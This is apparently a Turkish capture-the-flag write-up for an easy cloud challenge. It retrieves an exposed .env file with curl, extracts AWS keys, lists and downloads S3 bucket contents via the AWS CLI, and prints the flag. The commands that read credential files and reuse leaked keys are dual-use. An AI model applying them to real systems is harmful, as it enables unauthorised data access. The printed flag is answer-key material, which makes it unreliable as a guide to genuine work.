# 🎯 E Corp - Cloud Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Cloud-Challenge-darkblue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Misconfiguration-purple?style=for-the-badge" alt="Type">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Cloud  
**Seviye:** Kolay  
**Puan:** 300  

**Challenge Açıklaması:**  
E Corp'un kurumsal web sitesi yayına alınmış. Ancak geliştirici ekipten biri, production ortamında bir şeyleri silmeyi unutmuş gibi görünüyor. Acaba geride ne kaldı?

**Challenge URL:** `http://46.101.237.185:5001`

---

## 🔍 Analiz

**Hedef:** Production ortamında unutulmuş hassas verileri tespit edip flag’i elde etmek.

**Strateji:**  
`.env dosyası keşfi` → `AWS credentials çıkarımı` → `S3 servisine erişim` → `Bucket inceleme` → `Dosya analizi` → Flag

**İpuçları:**
- 🎯 `.env` dosyasının erişilebilir olması kritik zafiyet
- 🔍 AWS erişim anahtarları açık şekilde bırakılmış
- 💡 S3 endpoint özel (LocalStack benzeri)
- 🔑 Flag büyük ihtimalle bucket içindeki bir dosyada

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Hassas Dosya ve Dizinleri Keşfet**

Challenge açıklamasında production ortamında bir şeylerin unutulduğu belirtilmektedir. Bu nedenle klasik web misconfiguration kontrolleri yapılır.

Yaygın olarak açık bırakılan dosya ve dizinler test edilir:

```bash
/.env
/config
/.git
/backup
/admin
/.htaccess
```

Bu testler sırasında .env dosyasının erişilebilir olduğu tespit edilir:

```bash
curl http://46.101.237.185:5001/.env
```

**Çıktı:**
```
AWS_ACCESS_KEY_ID=AKIAECORP2026XYZNQ
AWS_SECRET_ACCESS_KEY=...
AWS_ENDPOINT_URL=http://46.101.237.185:4566
S3_BUCKET=ecorp-internal
```

**Analiz:**
- ✅ Kritik hassas bilgiler açığa çıkmış
- 💡 AWS servislerine doğrudan erişim sağlanabilir
- 🎯 Bir sonraki adım: S3 servisine bağlanmak

---

### 🔬 **Adım 2: S3 Servisini Keşfet**

```bash
aws --endpoint-url http://46.101.237.185:4566 s3 ls
```

**Çıktı:**
```
ecorp-internal
ecorp-public
```

```bash
aws --endpoint-url http://46.101.237.185:4566 s3 ls s3://ecorp-internal --recursive
```

**Çıktı:**
```
migration-memo.txt
```

**Analiz:**
- ✅ Bucket erişimi açık
- 💡 Internal bucket içinde tek dosya var
- 🎯 Dosya indirilmeli

---

### 🧠 **Adım 3: Dosyayı İndir ve Analiz Et**

```bash
aws --endpoint-url http://46.101.237.185:4566 s3 cp s3://ecorp-internal/migration-memo.txt .
cat migration-memo.txt
```

**Çıktı:**
```
Pito{ecorp_cloud_secrets_exposed_never_leave_env_in_prod_800dolarbounty}
```

**Analiz:**
- ✅ Flag doğrudan dosya içinde bulunuyor
- 💡 Memo aslında flag’i saklayan bir bait dosya

---

### 🚩 **Adım 4: Flag’i Elde Et**

```
Pito{ecorp_cloud_secrets_exposed_never_leave_env_in_prod_800dolarbounty}
```

---

## 🚩 **FLAG**
```
Pito{ecorp_cloud_secrets_exposed_never_leave_env_in_prod_800dolarbounty}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>.env dosyasını çekmek</sub></td>
<td align="center">☁️<br><b>AWS CLI</b><br><sub>S3 erişimi</sub></td>
<td align="center">💻<br><b>Linux Terminal</b><br><sub>Komut çalıştırma</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 E Corp Cloud Challenge
       ↓
🔎 .env dosyası keşfedildi
       ↓
🔬 AWS credentials elde edildi
       ↓
🧠 S3 servisine bağlanıldı
       ↓
📂 migration-memo.txt bulundu
       ↓
🚩 FLAG: Pito{ecorp_cloud_secrets_exposed_never_leave_env_in_prod_800dolarbounty}
```
